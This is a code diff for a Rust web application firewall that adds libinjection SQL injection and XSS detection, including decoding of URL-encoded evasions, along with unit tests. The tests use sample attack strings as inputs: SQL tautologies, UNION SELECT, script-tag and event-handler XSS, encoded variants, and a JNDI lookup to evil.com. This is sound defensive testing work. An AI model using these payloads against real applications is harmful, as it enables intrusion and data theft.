@@ -16,7 +16,7 @@ use tracing::{debug, warn};
 
 use waf_common::{DetectionResult, Phase, RequestCtx};
 
-use super::Check;
+use super::{Check, url_decode, url_decode_recursive};
 
 // ── Minimal embedded fallback rules ──────────────────────────────────────────
 // Used when the rules/owasp-crs/ directory cannot be found at runtime.
@@ -115,6 +115,10 @@ enum CompiledMatcher {
     NotIn(Vec<String>),
     Gt(i64),
     Lt(i64),
+    /// libinjection SQL injection detection (CRS-942100 etc.)
+    DetectSqli,
+    /// libinjection XSS detection (CRS-941100 etc.)
+    DetectXss,
 }
 
 struct CompiledRule {
@@ -157,6 +161,48 @@ impl CompiledRule {
                 .as_ref()
                 .and_then(|v| v.parse::<i64>().ok())
                 .is_some_and(|v| v < *n),
+            CompiledMatcher::DetectSqli => {
+                self.detect_injection(ctx, |input| libinjectionrs::detect_sqli(input).is_injection())
+            }
+            CompiledMatcher::DetectXss => {
+                self.detect_injection(ctx, |input| libinjectionrs::detect_xss(input).is_injection())
+            }
+        }
+    }
+
+    /// Run a libinjection detector against the appropriate request fields.
+    ///
+    /// For the `"all"` field, scans path, query, body, and header values
+    /// (matching CRS behavior for libinjection rules).  Each value is tested
+    /// in raw form, single-decoded form, and recursively-decoded form (up to
+    /// 3 passes) to catch `%`-encoded and double/triple-encoded evasion attempts.
+    /// For a specific field, only that field is tested in all three forms.
+    fn detect_injection(&self, ctx: &RequestCtx, detector: impl Fn(&[u8]) -> bool) -> bool {
+        // Helper: test raw, single-decoded, and recursively-decoded forms.
+        let detect_with_decode = |raw: &str| -> bool {
+            if detector(raw.as_bytes()) {
+                return true;
+            }
+            let decoded = url_decode(raw);
+            if decoded != raw && detector(decoded.as_bytes()) {
+                return true;
+            }
+            let recursive = url_decode_recursive(raw);
+            recursive != decoded && detector(recursive.as_bytes())
+        };
+
+        match self.field.as_str() {
+            "all" => {
+                detect_with_decode(&ctx.path)
+                    || detect_with_decode(&ctx.query)
+                    || detector(&ctx.body_preview)
+                    || {
+                        let body_str = String::from_utf8_lossy(&ctx.body_preview);
+                        detect_with_decode(&body_str)
+                    }
+                    || ctx.headers.values().any(|v| detect_with_decode(v))
+            }
+            _ => self.get_field(ctx).as_ref().is_some_and(|v| detect_with_decode(v)),
         }
     }
 
@@ -324,6 +370,8 @@ fn compile_rule(r: YamlRule) -> Option<CompiledRule> {
             };
             CompiledMatcher::Lt(n)
         }
+        "detect_sqli" | "@detectSQLi" => CompiledMatcher::DetectSqli,
+        "detect_xss" | "@detectXSS" => CompiledMatcher::DetectXss,
         op => {
             debug!("Skipping OWASP rule {} with unsupported operator '{op}'", r.id);
             return None;
@@ -410,6 +458,35 @@ mod tests {
         }
     }
 
+    fn make_ctx_with_query(query: &str) -> RequestCtx {
+        let dc = DefenseConfig {
+            owasp_set: true,
+            ..DefenseConfig::default()
+        };
+        let host_config = Arc::new(HostConfig {
+            code: "test".into(),
+            host: "example.com".into(),
+            defense_config: dc,
+            ..HostConfig::default()
+        });
+        RequestCtx {
+            req_id: "test".into(),
+            client_ip: "1.2.3.4".parse().unwrap(),
+            client_port: 0,
+            method: "GET".into(),
+            host: "example.com".into(),
+            port: 80,
+            path: "/".into(),
+            query: query.into(),
+            headers: HashMap::new(),
+            body_preview: Bytes::new(),
+            content_length: 0,
+            is_tls: false,
+            host_config,
+            geo: None,
+        }
+    }
+
     #[test]
     fn test_invalid_method_blocked() {
         let checker = OWASPCheck::new();
@@ -442,5 +519,250 @@ mod tests {
         let mut ctx = make_ctx("GET", "/", 0);
         ctx.path = "${jndi:ldap://evil.com/a}".into();
         assert!(checker.check(&ctx).is_some());
+    }
+
+    // ── detect_sqli tests ────────────────────────────────────────────────────
+
+    const SQLI_RULE_YAML: &str = r#"
+version: "1.0"
+rules:
+  - id: CRS-942100
+    name: SQL Injection Attack Detected via libinjection
+    category: sqli
+    severity: critical
+    paranoia: 1
+    field: all
+    operator: detect_sqli
+    value: ""
+    action: block
+"#;
+
+    #[test]
+    fn detect_sqli_blocks_or_tautology() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        assert_eq!(checker.rule_count(), 1);
+        let ctx = make_ctx_with_query("id=1' OR '1'='1");
+        let result = checker.check(&ctx);
+        assert!(result.is_some(), "Should detect SQL injection tautology");
+    }
+
+    #[test]
+    fn detect_sqli_blocks_union_select() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
+        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
+    }
+
+    #[test]
+    fn detect_sqli_allows_clean_input() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let ctx = make_ctx_with_query("name=alice&page=2");
+        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
+    }
+
+    #[test]
+    fn detect_sqli_checks_body() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let mut ctx = make_ctx("POST", "/login", 0);
+        ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
+        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
+    }
+
+    #[test]
+    fn detect_sqli_checks_headers() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let mut ctx = make_ctx("GET", "/", 0);
+        ctx.headers.insert("referer".into(), "http://x/' OR '1'='1".into());
+        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
+    }
+
+    // ── detect_xss tests ─────────────────────────────────────────────────────
+
+    const XSS_RULE_YAML: &str = r#"
+version: "1.0"
+rules:
+  - id: CRS-941100
+    name: XSS Attack Detected via libinjection
+    category: xss
+    severity: critical
+    paranoia: 1
+    field: all
+    operator: detect_xss
+    value: ""
+    action: block
+"#;
+
+    #[test]
+    fn detect_xss_blocks_script_tag() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        assert_eq!(checker.rule_count(), 1);
+        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
+        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
+    }
+
+    #[test]
+    fn detect_xss_blocks_event_handler() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
+        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
+    }
+
+    #[test]
+    fn detect_xss_allows_clean_input() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        let ctx = make_ctx_with_query("q=hello+world&page=1");
+        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
+    }
+
+    #[test]
+    fn detect_xss_checks_body() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        let mut ctx = make_ctx("POST", "/comment", 0);
+        ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
+        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
+    }
+
+    // ── compile_rule operator alias tests ────────────────────────────────────
+
+    #[test]
+    fn detect_sqli_modsec_alias_works() {
+        let yaml = r#"
+version: "1.0"
+rules:
+  - id: TEST-001
+    name: SQLi via ModSec alias
+    category: sqli
+    severity: critical
+    paranoia: 1
+    field: query
+    operator: "@detectSQLi"
+    value: ""
+    action: block
+"#;
+        let checker = OWASPCheck::from_yaml(yaml);
+        assert_eq!(checker.rule_count(), 1, "@detectSQLi alias should compile");
+    }
+
+    #[test]
+    fn detect_xss_modsec_alias_works() {
+        let yaml = r#"
+version: "1.0"
+rules:
+  - id: TEST-002
+    name: XSS via ModSec alias
+    category: xss
+    severity: critical
+    paranoia: 1
+    field: query
+    operator: "@detectXSS"
+    value: ""
+    action: block
+"#;
+        let checker = OWASPCheck::from_yaml(yaml);
+        assert_eq!(checker.rule_count(), 1, "@detectXSS alias should compile");
+    }
+
+    // ── single-field detection tests ─────────────────────────────────────────
+
+    #[test]
+    fn detect_sqli_single_field_query() {
+        let yaml = r#"
+version: "1.0"
+rules:
+  - id: TEST-003
+    name: SQLi on query field only
+    category: sqli
+    severity: critical
+    paranoia: 1
+    field: query
+    operator: detect_sqli
+    value: ""
+    action: block
+"#;
+        let checker = OWASPCheck::from_yaml(yaml);
+        // Should detect in query
+        let ctx = make_ctx_with_query("id=1' OR '1'='1");
+        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
+        // Should NOT detect in path when field is query-only
+        let mut ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
+        ctx2.query = String::new();
+        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
+    }
+
+    // ── URL-encoded evasion tests ────────────────────────────────────────────
+
+    #[test]
+    fn detect_sqli_url_encoded_evasion() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        // %27 = single quote, %20 = space, %3D = equals
+        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
+        assert!(
+            checker.check(&ctx).is_some(),
+            "Should detect URL-encoded SQLi after decoding"
+        );
+    }
+
+    #[test]
+    fn detect_xss_url_encoded_evasion() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        // %3Cscript%3E = <script>
+        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
+        assert!(
+            checker.check(&ctx).is_some(),
+            "Should detect URL-encoded XSS after decoding"
+        );
+    }
+
+    // ── Edge case tests ──────────────────────────────────────────────────────
+
+    #[test]
+    fn detect_sqli_empty_input_safe() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let ctx = make_ctx("GET", "/", 0);
+        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
+    }
+
+    #[test]
+    fn detect_xss_empty_input_safe() {
+        let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
+        let ctx = make_ctx("GET", "/", 0);
+        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
+    }
+
+    #[test]
+    fn detect_sqli_non_utf8_body() {
+        let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
+        let mut ctx = make_ctx("POST", "/", 0);
+        // Binary payload with some valid SQL-like bytes mixed in
+        ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
+        assert!(
+            checker.check(&ctx).is_none(),
+            "Random binary data should not trigger SQLi"
+        );
+    }
+
+    #[test]
+    fn detect_sqli_paranoia_level_filtering() {
+        let yaml = r#"
+version: "1.0"
+rules:
+  - id: CRS-942100-PL3
+    name: SQLi detection at paranoia level 3
+    category: sqli
+    severity: critical
+    paranoia: 3
+    field: all
+    operator: detect_sqli
+    value: ""
+    action: block
+"#;
+        let checker = OWASPCheck::from_yaml(yaml);
+        assert_eq!(checker.rule_count(), 1);
+        // Default paranoia is 1, so PL3 rule should be skipped
+        let ctx = make_ctx_with_query("id=1' OR '1'='1");
+        assert!(
+            checker.check(&ctx).is_none(),
+            "PL3 rule should be skipped at default paranoia level 1"
+        );
     }
 }
